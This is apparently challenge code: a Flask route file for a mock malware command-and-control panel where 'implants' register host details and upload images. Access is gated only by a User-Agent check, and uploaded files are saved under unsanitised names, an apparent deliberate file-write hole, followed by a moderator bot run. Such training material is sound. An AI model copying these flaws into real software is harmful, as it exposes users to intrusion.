import os, random
from flask import Blueprint, request, current_app
from application.util.bot import bot_runner
from application.util.general import response, regions, allowed_file, check_img
from application.util.mysql import MysqlInterface

comms = Blueprint("comms", __name__)

def implant_middleware(func):
    def check_moderator(*args, **kwargs):
        user_agent = request.headers.get("User-Agent")
        if not current_app.config["IMPLANT_AGENT_NAME"] in user_agent:
            return response("Unauthorized"), 401

        return func(*args, **kwargs)

    check_moderator.__name__ = func.__name__
    return check_moderator


@comms.route("/register", methods=["POST"])
@implant_middleware
def register():        
    data = request.json
    
    if (not "version" in data or 
        not "antivirus" in data or 
        not "arch" in data or 
        not "platform" in data or 
        not "hostname" in data or 
        not "rights" in data
    ):
        return response("Missing parameters"), 400

    mysql_interface = MysqlInterface(current_app.config)    

    registered = mysql_interface.register_implant(
        request.remote_addr, 
        random.choice(regions), 
        data["version"], 
        data["antivirus"], 
        data["arch"], 
        data["platform"], 
        data["hostname"], 
        data["rights"],
        None
    )
    
    return registered, 200


@comms.route("/check/<identifier>/<token>", methods=["GET"])
@implant_middleware
def check(identifier, token):
    if not identifier or not token:
        return response("Missing parameters"), 400
    
    mysql_interface = MysqlInterface(current_app.config)
    authenticated = mysql_interface.check_implant(identifier, token)
    
    if not authenticated:
        return response("Unauthorized"), 401
    
    return response("Authorized"), 200
    

@comms.route("/update/<identifier>/<token>", methods=["POST"])
@implant_middleware
def update(identifier, token):
    if not identifier or not token:
        return response("Missing parameters"), 400
    
    if "image" not in request.files:
        return response("No image"), 400
    
    image_file = request.files["image"]

    if image_file.filename == "":
        return response("No selected image"), 400

    if not allowed_file(image_file.filename, current_app.config["ALLOWED_EXTENSIONS"]):
        return response("Invalid image extension"), 403
        
    mysql_interface = MysqlInterface(current_app.config)
    authenticated = mysql_interface.check_implant(identifier, token)
    
    if not authenticated:
         return response("Unauthorized"), 401
        
    data = request.form
    
    if (not "version" in data or 
        not "antivirus" in data or 
        not "arch" in data or 
        not "platform" in data or 
        not "hostname" in data or 
        not "rights" in data
    ):
        return response("Missing parameters"), 400

    image_filename = identifier + "_" + image_file.filename
    image_file.save(os.path.join(current_app.config["UPLOAD_FOLDER"] + "/", image_filename))

    img_path = current_app.config["UPLOAD_FOLDER"] + "/" + image_filename

    if not check_img(img_path):
        os.remove(img_path)
        return response("Invalid image"), 403

    mysql_interface.update_implant(
        identifier,
        request.remote_addr,
        random.choice(regions), 
        data["version"], 
        data["antivirus"], 
        data["arch"], 
        data["platform"], 
        data["hostname"], 
        data["rights"],
        "/static/uploads/" + image_filename
    )
    
    bot_runner(current_app.config["MODERATOR_USER"], current_app.config["MODERATOR_PASSWORD"], current_app.config["BOT_AGENT_NAME"], identifier)

    return response("Updated"), 201
        